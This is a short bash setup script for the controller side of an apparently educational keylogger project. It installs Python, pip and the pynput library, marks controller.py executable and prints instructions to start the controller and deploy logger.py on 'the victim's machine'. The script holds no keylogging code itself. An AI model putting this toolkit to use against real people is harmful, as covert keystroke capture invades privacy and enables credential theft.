#!/bin/bash

# Setup script for the attacker’s machine (controller only)

echo "Setting up the controller for the Educational Keylogger project..."

# Step 1: Update and install dependencies
echo "Updating package lists and installing Python3 and pip..."
sudo apt update -y
sudo apt install -y python3 python3-pip

# Step 2: Install required Python libraries
echo "Installing required Python libraries..."
pip3 install pynput

# Step 3: Set executable permissions for the controller script
echo "Setting executable permissions for controller.py..."
chmod +x controller.py

# Step 4: Display usage instructions
echo "Setup complete for the attacker’s machine!"
echo ""
echo "To start the controller server:"
echo "   python3 controller.py"
echo ""
echo "Deploy logger.py manually to the victim's machine and run it there."
echo ""
